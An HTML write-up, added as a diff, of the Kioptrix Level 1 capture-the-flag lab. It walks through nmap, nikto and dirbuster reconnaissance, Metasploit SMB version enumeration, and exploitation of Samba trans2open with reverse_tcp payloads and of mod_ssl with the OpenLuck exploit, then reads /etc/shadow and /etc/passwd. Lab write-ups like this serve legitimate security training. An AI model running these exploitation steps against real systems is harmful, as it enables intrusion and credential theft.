@@ -1,0 +1,181 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>kioptrix</title>
+</head><body><span style="font-size: 14pt">step 1 : dawnlod kioptrix level1 from google , install it on virtual box ,give 2gb RAm and network adapter as NAT<br/>
+we follow this report as steps of ethicak hacling <br/>
+<br/>
+</span><span style="font-size: 14pt">Phase 1 : reconnaissance</span><span style="font-size: 15pt">[</span><span style="font-size: 14pt">information gethering { active /passive}]<br/>
+</span><span style="font-size: 14pt">first we need to find ip address of machine<br/>
+as we know there are many ways to find IP address of target machine installed in our network <br/>
+=&gt; find IP address of target <br/>
+1. by target machine itself : <ul><li style="list-style-type: none"><ul><li style="list-style-type: none">-&gt; ping 8.8.8.8 </li>
+</ul>
+</li>
+</ul>
+<img height="221" src="image.png" width="650"/><br/>
+2. by attack machine :<br/>
+ip address of kali : <br/>
+	ifconfig<br/>
+</span><img height="169" src="image 2.png" width="650"/><br/>
+<span style="font-size: 14pt">our target machine IP is nearby to our host machine ip address as they belongs to same network <br/>
+<img height="172" src="image 3.png" width="650"/>  <br/>
+</span><span style="font-size: 16pt"><b>so . our first finding out target machine IP addres : 192.168.85.129 <br/>
+</b></span><span style="font-size: 14pt">no check if machine is responsing or not our ping <br/>
+<img src="image 4.png"/><br/>
+<br/>
+phase 2 : scanning and enumeration<br/>
+=&gt; port scaning : nmap<br/>
+nmap is port scaning tool , which scan for open port uses stealth scaning <br/>
+we are finding all open port and service associated with them <br/>
+		-&gt;nmap -T4 -p- -A 192.168.85.129<br/>
+</span><img src="image 5.png"/><img src="image 6.png"/> <br/>
+<b><span style="font-size: 14pt">namp give us folllowing details <br/>
+</span><span style="font-size: 16pt">open port : 22 : tcp/ssh  : openssh version (2.9p2)<br/>
+open port :80 : http     : apache(1.3.20) [ UNIX ] { redhat /linux}<br/>
+mod_ssl vresion(2.8.4)<br/>
+OpenSSL version(0.9.6b)<br/>
+open port : 111 : tcp   : rpcbind<br/>
+open port :139 : tcp   : netbios samba smbd <br/>
+</span><span style="font-size: 16pt">open port :443 : https  : apache(1.3.20) unix { redhat /linux}</span><span style="font-size: 15pt"><br/>
+</span><span style="font-size: 15pt">open port : 32768 : (rpc # 100024)<br/>
+device runing on vmware<br/>
+runing on linux 2.4.X<br/>
+os details : linux 2.4.9 - 2.4.18<br/>
+</span></b><span style="font-size: 14pt"><br/>
+=&gt;we can scan for UDP port also by , but takes alot time due to its connection less nature <br/>
+	-&gt;nmap -sU -T4 -p 192.168.85.129 <br/>
+<br/>
+# enumertaion HTTP/HTTPS <br/>
+search on google <br/>
+http://192.168.85.129<br/>
+https://192.168.85.129 <br/>
+<br/>
+<img height="178" src="image 7.png" width="500"/> <img height="193" src="image 8.png" width="500"/> <br/>
+<br/>
+<img src="image 9.png"/><br/>
+<br/>
+as we can see this web page exlpore this page, click on each and every links on this web page and note needed information <br/>
+also it verify our gethered information like<br/>
+</span><b><span style="font-size: 16pt">apache is used<br/>
+</span></b><b><span style="font-size: 16pt">os is redhat linux</span></b><span style="font-size: 14pt"><br/>
+</span><span style="font-size: 14pt">=&gt; nikto : it is vulnerability scanner tool <br/>
+<img height="422" src="image 10.png" width="900"/> <br/>
+<img height="162" src="image 11.png" width="900"/><br/>
+nikto gives us various information like <br/>
+</span><b><span style="font-size: 16pt">verify version of server , mod_ssl, openssl<br/>
+X-xxs protection header not defined <br/>
+=&gt; outdated version : <br/>
+  	openssl 0.9.6b is outdated<br/>
+	mod_ssl is outdated <br/>
+	apache 1.3.20 is outdated <br/>
+allowed HTTP method : GET , HEAD ,TRACE ,OPTIONS <br/>
+=&gt; crossponding vulnerability<ul><li style="list-style-type: none">Trace methon is active , vulnerable to XST</li>
+<li style="list-style-type: none">apache vulnerable to DDos and possible code execution and local buffer overflow and overflow in mod_rewrite &amp; mod_cgi</li>
+<li style="list-style-type: none">mod ssl is vulnerable to remoter buffer overflow </li>
+<li style="list-style-type: none">wealizer may install , vulnerable to XSS(cross side scripting)</li>
+</ul>
+=&gt; find files<br/>
+</span></b><b><span style="font-size: 16pt">=&gt; a backdor is identifed </span></b><span style="font-size: 14pt"><br/>
+</span><span style="font-size: 14pt"><br/>
+note : we can use nikto for https port 443 also<br/>
+	nikto -h https://192.168.85.129<br/>
+<img src="image 12.png"/><br/>
+<br/>
+<br/>
+we have one more tool -&gt; dirbuster : it is web appliction brute force tool<br/>
+<br/>
+<img height="383" src="image 13.png" width="800"/> <br/>
+here <br/>
+target url : http://192.168.85.129 :80/<br/>
+no of threds : 40<br/>
+file with list of dir : usr/share/woedlist/dirbuster/directory-list-small.txt<br/>
+file extension : you can give pdf,jpg,jpeg,php,html,zip, etc<br/>
+start scan<br/>
+it finds all directory structure in the target url <br/>
+<img height="450" src="image 14.png" width="800"/> <br/>
+you can check each and every directory and searech for information<br/>
+</span><b><span style="font-size: 16pt">in usage directory's html pages we find webalizer version (2.01) <br/>
+</span></b><span style="font-size: 14pt"><br/>
+# enumerating smb : file sharing : port 139<br/>
+start meta sploit <br/>
+	-&gt;msfconsole<br/>
+<img src="image 15.png"/><br/>
+    -&gt; search smb<br/>
+it gives many options with no , we want to see version of samba <br/>
+<img src="image 16.png"/>  <br/>
+so search auxiliary/scanner/smb/smb_version , in my pc it is at 96 <br/>
+we can use it by no or by full name <ul><li style="list-style-type: none">use 96</li>
+<li style="list-style-type: none">use auxiliary/scanner/smb/smb_version</li>
+<li style="list-style-type: none">-&gt; info </li>
+</ul>
+<img height="369" src="image 17.png" width="800"/><br/>
+rhost is target so set target<br/>
+	-&gt; set rhost 192.168.85.129<br/>
+<img src="image 18.png"/><br/>
+run<br/>
+<img src="image 19.png"/><br/>
+<br/>
+</span><span style="font-size: 16pt"><b>this gives us version of smb samba (2.2.1a) <br/>
+<br/>
+Phase 3 : exploitation<br/>
+</b><span style="font-size: 14pt">we can use many tools for exploitation<br/>
+1. meatsploit<br/>
+open metasploit<br/>
+	-&gt; msfconsole<br/>
+ 	-&gt;searchsploit samba 2.2<br/>
+<img height="306" src="image 20.png" width="800"/><br/>
+samba have many exploit for trans2open so we cam use this <br/>
+	-&gt;search trans2open<br/>
+<img height="189" src="image 21.png" width="800"/> <br/>
+we know kioptrix have linux so use 1 <br/>
+	-&gt;use1<br/>
+<img height="337" src="image 22.png" width="800"/><br/>
+set to rhost 192.168.85.129 { target address}<br/>
+and run or exploit<br/>
+<br/>
+<img src="image 23.png"/><br/>
+here our meterpreter session died that means our payload does not worked <br/>
+we need to change payload ctrl+c to interrupt<br/>
+	-&gt;options<br/>
+<img height="289" src="image 24.png" width="800"/><br/>
+not it is giving us payload options : linux/x86/meterpreter/reverse_tcp (staged payload)<br/>
+<img src="image 25.png"/><br/>
+metasploit suggest us reverse_tcp payload <br/>
+we have two payload <br/>
+1. staged<br/>
+2. non-staged<br/>
+try both<br/>
+#<br/>
+load staged payload and run <br/>
+session died<br/>
+<br/>
+<img src="image 26.png"/><br/>
+</span></span><span style="font-size: 14pt">load non staged payload and run <br/>
+</span><img height="310" src="image 27.png" width="850"/><br/>
+<span style="font-size: 14pt">we got access <br/>
+now we in kioptrix machin terminal<br/>
+kioptrix is old machine so it doesnt support all modern linux command but it support all other commands. <br/>
+it support <br/>
+ls<br/>
+cat<br/>
+cat /etc/shadow<br/>
+cat /etc/passwd<br/>
+<br/>
+# if you don't want to use metasploit then you can externally dawnlod exlpoit and run it <br/>
+## mannual exploitation (ssl)<br/>
+<br/>
+-&gt; dawnlod openluck :https://github.com/heltonWernik/OpenLuck<br/>
+-&gt;clone this<br/>
+-&gt;get openfuck.c script file<br/>
+-&gt;run it by ./openfuck<br/>
+<img src="image 28.png"/><br/>
+select required offset and use this according to given syntax<br/>
+<img src="image 29.png"/> <br/>
+<img src="image 30.png"/><br/>
+we got access to kioptrix <br/>
+ <br/>
+<br/>
+<br/>
+<br/>
+</span></body></html>
